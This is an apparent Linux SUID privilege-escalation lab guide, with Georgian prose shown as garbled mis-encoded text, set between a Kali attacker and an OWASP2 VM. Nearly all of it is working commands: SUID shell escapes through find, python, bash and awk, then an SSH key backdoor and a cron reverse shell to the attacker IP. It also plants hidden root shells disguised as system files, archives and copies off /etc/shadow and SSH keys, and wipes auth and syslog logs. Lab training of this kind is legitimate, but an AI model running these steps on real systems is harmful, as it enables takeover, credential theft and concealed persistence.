# SUID Privilege Escalation Lab ğŸ¯
**Attacker:** Kali Linux (172.16.52.219)  
**Target:** OWASP2 VM (172.16.50.72)

---

## Phase 1: Target áƒ›áƒáƒ›áƒ–áƒáƒ“áƒ”áƒ‘áƒ (OWASP2 VM - 172.16.50.72)

### STEP 1: SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ”áƒ‘áƒ˜áƒ¡ áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ (Root áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒšáƒ˜áƒ—)

```bash
# SSH Target-áƒ¨áƒ˜ (root-áƒ˜áƒ— áƒáƒœ sudo user-áƒ˜áƒ—)
ssh root@172.16.50.72

# 1) Find áƒ‘áƒ˜áƒœáƒáƒ áƒ˜áƒ¡ áƒ™áƒáƒáƒ˜áƒ áƒ”áƒ‘áƒ (áƒ§áƒ•áƒ”áƒšáƒáƒ–áƒ” áƒ¡áƒáƒ˜áƒ›áƒ”áƒ“áƒ)
cp /usr/bin/find /tmp/vuln_find
chmod 4755 /tmp/vuln_find
chown root:root /tmp/vuln_find

# 2) Python áƒ‘áƒ˜áƒœáƒáƒ áƒ˜áƒ¡ áƒ™áƒáƒáƒ˜áƒ áƒ”áƒ‘áƒ  
cp /usr/bin/python3 /tmp/vuln_python
chmod 4755 /tmp/vuln_python
chown root:root /tmp/vuln_python

# 3) Bash áƒ‘áƒ˜áƒœáƒáƒ áƒ˜áƒ¡ áƒ™áƒáƒáƒ˜áƒ áƒ”áƒ‘áƒ
cp /bin/bash /tmp/vuln_bash  
chmod 4755 /tmp/vuln_bash
chown root:root /tmp/vuln_bash

# 4) AWK áƒ‘áƒ˜áƒœáƒáƒ áƒ˜áƒ¡ áƒ™áƒáƒáƒ˜áƒ áƒ”áƒ‘áƒ
cp /usr/bin/awk /tmp/vuln_awk
chmod 4755 /tmp/vuln_awk  
chown root:root /tmp/vuln_awk
```

### STEP 2: Test User áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ

```bash
# Target OWASP2-áƒ–áƒ” (root-áƒ˜áƒ—)
useradd -m -s /bin/bash hackme
echo "hackme:password123" | chpasswd

# /tmp áƒ“áƒ˜áƒ áƒ”áƒ¥áƒ¢áƒáƒ áƒ˜áƒ˜áƒ¡ áƒ£áƒ¤áƒšáƒ”áƒ‘áƒ”áƒ‘áƒ˜
chmod 777 /tmp

# áƒ“áƒáƒ“áƒáƒ¡áƒ¢áƒ£áƒ áƒ”áƒ‘áƒ
ls -la /tmp/vuln_*
# áƒ£áƒœáƒ“áƒ áƒ•áƒœáƒáƒ®áƒáƒ—: -rwsr-xr-x 1 root root
```

---

## Phase 2: Initial Access (Kali - 172.16.52.219)

### STEP 1: Target-áƒ¨áƒ˜ áƒ¨áƒ”áƒ¡áƒ•áƒšáƒ áƒ áƒáƒ’áƒáƒ áƒª Low-Privilege User

```bash
# Kali Terminal
ssh hackme@172.16.50.72
# Password: password123

# áƒáƒœ old SSH algorithms-áƒ˜áƒ— áƒ—áƒ£ áƒ¡áƒáƒ­áƒ˜áƒ áƒáƒ
ssh -oHostKeyAlgorithms=+ssh-rsa hackme@172.16.50.72
```

### STEP 2: áƒáƒ˜áƒ áƒ•áƒ”áƒšáƒáƒ“áƒ˜ Enumeration

```bash
# Target OWASP2-áƒ–áƒ” (hackme user)
whoami
# Output: hackme

id
# Output: uid=1001(hackme) gid=1001(hackme) groups=1001(hackme)

# Sudo áƒ£áƒ¤áƒšáƒ”áƒ‘áƒ”áƒ‘áƒ˜áƒ¡ áƒ¨áƒ”áƒ›áƒáƒ¬áƒ›áƒ”áƒ‘áƒ
sudo -l
# Likely: Sorry, user hackme may not run sudo...

# System info
uname -a
hostname
```

---

## Phase 3: SUID Discovery & Exploitation ğŸ’¥

### STEP 1: SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ”áƒ‘áƒ˜áƒ¡ áƒ›áƒáƒ«áƒ”áƒ‘áƒœáƒ

```bash
# Target OWASP2-áƒ–áƒ” (hackme user)
find / -perm -4000 -type f 2>/dev/null | grep tmp
# áƒ›áƒáƒ¡áƒáƒšáƒáƒ“áƒœáƒ”áƒšáƒ˜ output:
# /tmp/vuln_find
# /tmp/vuln_python  
# /tmp/vuln_bash
# /tmp/vuln_awk

# Verification
ls -la /tmp/vuln_*
```

### STEP 2: Exploitation - Method 1 (Find) ğŸ¯

```bash
# Target OWASP2-áƒ–áƒ” (hackme user)
/tmp/vuln_find . -exec /bin/bash -p \; -quit

# Root shell áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ˜áƒ¡ áƒ¨áƒ”áƒ›áƒ“áƒ”áƒ’
whoami
# Output: root

id  
# Output: uid=0(root) gid=0(root) groups=0(root)
```

### STEP 3: Exploitation - Method 2 (Python) ğŸ

```bash
# áƒ—áƒ£ find áƒáƒ  áƒ˜áƒ›áƒ£áƒ¨áƒáƒ•áƒ
/tmp/vuln_python -c "import os; os.setuid(0); os.system('/bin/bash -p')"

# áƒáƒœ
/tmp/vuln_python -c "import os; os.execl('/bin/bash', 'bash', '-p')"
```

### STEP 4: Exploitation - Method 3 (Bash) ğŸ’¥

```bash
# áƒ—áƒ£ python áƒáƒ  áƒ˜áƒ›áƒ£áƒ¨áƒáƒ•áƒ  
/tmp/vuln_bash -p

# -p flag áƒ˜áƒœáƒáƒ áƒ©áƒ£áƒœáƒ”áƒ‘áƒ¡ privileged mode-áƒ¡
```

### STEP 5: Exploitation - Method 4 (AWK) âš¡

```bash
# áƒ—áƒ£ bash áƒáƒ  áƒ˜áƒ›áƒ£áƒ¨áƒáƒ•áƒ
/tmp/vuln_awk 'BEGIN {system("/bin/bash -p")}'

# áƒáƒœ  
echo | /tmp/vuln_awk '{system("/bin/bash -p")}'
```

---

## Phase 4: Persistence Setup ğŸ”’

### Method 1: SSH Key Backdoor

```bash
# Target OWASP2-áƒ–áƒ” (root shell)
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# Kali Terminal (áƒáƒ®áƒáƒšáƒ˜ tab/window)
ssh-keygen -t rsa -b 4096 -f /tmp/owasp2_key
# áƒáƒ  áƒ¨áƒ”áƒ˜áƒ§áƒ•áƒáƒœáƒ passphrase

# Public key-áƒ˜áƒ¡ áƒœáƒáƒ®áƒ•áƒ
cat /tmp/owasp2_key.pub

# Target-áƒ–áƒ” áƒ£áƒ™áƒáƒœ (root shell)  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Test Kali-áƒ“áƒáƒœ
ssh -i /tmp/owasp2_key root@172.16.50.72
```

### Method 2: Reverse Shell Persistence

```bash
# Kali-áƒ–áƒ” Listener áƒ’áƒáƒ¨áƒ•áƒ”áƒ‘áƒ
nc -lvnp 4444

# Target OWASP2-áƒ–áƒ” (root shell)
echo "*/2 * * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1" > /tmp/cron_job
crontab /tmp/cron_job

# Verification
crontab -l
# Output: */2 * * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1

# 2 áƒ¬áƒ£áƒ—áƒ˜áƒ¡ áƒ¨áƒ”áƒ›áƒ“áƒ”áƒ’ Kali listener-áƒ–áƒ” áƒ›áƒ˜áƒ•áƒ˜áƒ¦áƒ”áƒ‘áƒ— connection-áƒ¡
```

### Method 3: Permanent SUID Backdoor

```bash
# Target OWASP2-áƒ–áƒ” (root shell)
cp /bin/bash /var/tmp/.hidden_root
chmod 4755 /var/tmp/.hidden_root  
chown root:root /var/tmp/.hidden_root

# Hidden location-áƒ¨áƒ˜ áƒ“áƒáƒ›áƒáƒšáƒ•áƒ
cp /bin/bash /usr/lib/.systemd-private
chmod 4755 /usr/lib/.systemd-private
chown root:root /usr/lib/.systemd-private

# Access test (áƒ áƒáƒ’áƒáƒ áƒª hackme user)
/var/tmp/.hidden_root -p
whoami
# Output: root
```

---

## Phase 5: Post-Exploitation Activities ğŸ•µï¸

### Method 1: Data Exfiltration

```bash
# Target OWASP2-áƒ–áƒ” (root shell)
# áƒ›áƒœáƒ˜áƒ¨áƒ•áƒœáƒ”áƒšáƒáƒ•áƒáƒœáƒ˜ áƒ¤áƒáƒ˜áƒšáƒ”áƒ‘áƒ˜áƒ¡ áƒ™áƒáƒáƒ˜áƒ áƒ”áƒ‘áƒ
cp /etc/shadow /tmp/shadow_backup
cp /etc/passwd /tmp/passwd_backup  
tar -czf /tmp/system_backup.tar.gz /etc/passwd /etc/shadow /home/*/.ssh/

# Kali-áƒ–áƒ” áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ
scp -i /tmp/owasp2_key root@172.16.50.72:/tmp/system_backup.tar.gz ./
```

### Method 2: Network Scanning from Inside

```bash
# Target OWASP2-áƒ–áƒ” (root shell) 
# Internal network discovery
ip route
arp -a
netstat -tuln

# Port scanning local services
ss -tuln | grep LISTEN
```

---

## Phase 6: Cleanup & Stealth ğŸ§¹

### Option 1: áƒ¡áƒ áƒ£áƒšáƒ˜ áƒ’áƒáƒ¡áƒ£áƒ¤áƒ—áƒáƒ•áƒ”áƒ‘áƒ

```bash
# Target OWASP2-áƒ–áƒ” (root shell)
# SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ”áƒ‘áƒ˜áƒ¡ áƒ¬áƒáƒ¨áƒšáƒ
rm -f /tmp/vuln_*

# Cron jobs áƒ¬áƒáƒ¨áƒšáƒ  
crontab -r

# SSH keys áƒ¬áƒáƒ¨áƒšáƒ
rm -f /root/.ssh/authorized_keys

# Backdoors áƒ¬áƒáƒ¨áƒšáƒ
rm -f /var/tmp/.hidden_root
rm -f /usr/lib/.systemd-private  

# Test user áƒ¬áƒáƒ¨áƒšáƒ
userdel -r hackme

# Logs áƒ’áƒáƒ¡áƒ£áƒ¤áƒ—áƒáƒ•áƒ”áƒ‘áƒ  
echo > /var/log/auth.log
echo > /var/log/syslog
history -c
```

### Option 2: Stealth Persistence (áƒáƒ  áƒ¬áƒáƒ•áƒ¨áƒáƒšáƒáƒ— áƒ§áƒ•áƒ”áƒšáƒáƒ¤áƒ”áƒ áƒ˜)

```bash
# áƒ›áƒ®áƒáƒšáƒà¸” SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ”áƒ‘áƒ˜áƒ¡ áƒ¬áƒáƒ¨áƒšáƒ
rm -f /tmp/vuln_*

# Hidden backdoor áƒ“áƒáƒ¢áƒáƒ•áƒ”áƒ‘áƒ
# /usr/lib/.systemd-private áƒ“áƒáƒ áƒ©áƒ”áƒ¡

# Cron job-áƒ˜áƒ¡ áƒ¨áƒ”áƒªáƒ•áƒšáƒ áƒ£áƒ¤áƒ áƒ stealth-áƒ£áƒ áƒáƒ“
echo "0 3 * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1 >/dev/null 2>&1" | crontab -
```

---

## Lab Testing Checklist âœ…

### Pre-Exploitation
- [ ] Target-áƒ–áƒ” SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ”áƒ‘áƒ˜ áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ˜áƒšáƒ˜áƒ
- [ ] Test user (hackme) áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ˜áƒšáƒ˜áƒ  
- [ ] SSH connection áƒ›áƒ£áƒ¨áƒáƒáƒ‘áƒ¡ Kali-áƒ“áƒáƒœ

### Exploitation  
- [ ] SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ”áƒ‘áƒ˜áƒ¡ discovery
- [ ] Root shell áƒ›áƒ˜áƒ¦áƒ”áƒ‘áƒ find-áƒ˜áƒ—
- [ ] Python method áƒ¢áƒ”áƒ¡áƒ¢áƒ˜
- [ ] Bash method áƒ¢áƒ”áƒ¡áƒ¢áƒ˜  
- [ ] AWK method áƒ¢áƒ”áƒ¡áƒ¢áƒ˜

### Persistence
- [ ] SSH key backdoor
- [ ] Reverse shell cron job  
- [ ] Hidden SUID backdoor

### Verification
- [ ] Kali-áƒ“áƒáƒœ root SSH access
- [ ] Cron job reverse connection
- [ ] Hidden backdoor access

---

## áƒ’áƒáƒ£áƒ›áƒ¯áƒáƒ‘áƒ”áƒ¡áƒ”áƒ‘áƒ£áƒšáƒ˜ Script Automation ğŸš€

### Target Setup Script (OWASP2-áƒ–áƒ” áƒ’áƒáƒ¡áƒáƒ¨áƒ•áƒ”áƒ‘áƒ˜)

```bash
#!/bin/bash
# setup_lab.sh - Target OWASP2-áƒ–áƒ” áƒ’áƒáƒ¡áƒáƒ¨áƒ•áƒ”áƒ‘áƒ˜

echo "[+] Setting up SUID Privilege Escalation Lab..."

# SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ”áƒ‘áƒ˜áƒ¡ áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ
cp /usr/bin/find /tmp/vuln_find && chmod 4755 /tmp/vuln_find && chown root:root /tmp/vuln_find
cp /usr/bin/python3 /tmp/vuln_python && chmod 4755 /tmp/vuln_python && chown root:root /tmp/vuln_python  
cp /bin/bash /tmp/vuln_bash && chmod 4755 /tmp/vuln_bash && chown root:root /tmp/vuln_bash
cp /usr/bin/awk /tmp/vuln_awk && chmod 4755 /tmp/vuln_awk && chown root:root /tmp/vuln_awk

# Test user áƒ¨áƒ”áƒ¥áƒ›áƒœáƒ
useradd -m -s /bin/bash hackme
echo "hackme:password123" | chpasswd

echo "[+] Lab setup complete!"
echo "[+] SSH: hackme@172.16.50.72 (password: password123)"
ls -la /tmp/vuln_*
```

áƒáƒ› áƒšáƒáƒ‘áƒ›áƒ áƒœáƒáƒ›áƒ“áƒ•áƒ˜áƒšáƒáƒ“ áƒ£áƒœáƒ“áƒ áƒ˜áƒ›áƒ£áƒ¨áƒáƒáƒ¡! **find** áƒ›áƒ”áƒ—áƒáƒ“áƒ˜ áƒ—áƒ˜áƒ—áƒ¥áƒ›áƒ˜áƒ¡ áƒ§áƒáƒ•áƒ”áƒšáƒ—áƒ•áƒ˜áƒ¡ áƒ›áƒ£áƒ¨áƒáƒáƒ‘áƒ¡ SUID exploitation-áƒ˜áƒ¡áƒ—áƒ•áƒ˜áƒ¡. ğŸ¯

áƒ¡áƒªáƒáƒ“áƒ” áƒáƒ˜áƒ áƒ•áƒ”áƒš áƒ áƒ˜áƒ’áƒ¨áƒ˜ **find method**:
```bash
/tmp/vuln_find . -exec /bin/bash -p \; -quit
```
